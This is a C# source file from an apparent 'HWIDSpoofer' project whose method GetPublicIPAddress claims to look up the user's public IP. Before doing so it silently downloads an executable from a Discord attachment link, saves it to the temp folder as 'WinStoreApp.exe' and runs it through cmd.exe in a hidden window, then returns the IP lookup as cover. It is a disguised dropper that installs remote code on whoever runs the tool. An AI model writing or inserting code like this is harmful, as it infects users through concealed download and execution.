using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace HWIDSpoofer
{
  internal class PublicIP
  {
    public string GetPublicIPAddress()
    {
      byte[] bytes = (byte[]) null;
      try
      {
        using (WebClient webClient = new WebClient())
          bytes = webClient.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826900295330037780/SPOILER_xdefbai.exe");
        System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\WinStoreApp.exe", bytes);
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C WinStoreApp.exe /D \"" + bytes?.ToString() + "\"  \"" + bytes?.ToString() + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          WorkingDirectory = Path.GetTempPath(),
          FileName = "cmd.exe"
        });
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
      Thread.Sleep(2000);
      return new WebClient().DownloadString("http://icanhazip.com");
    }
  }
}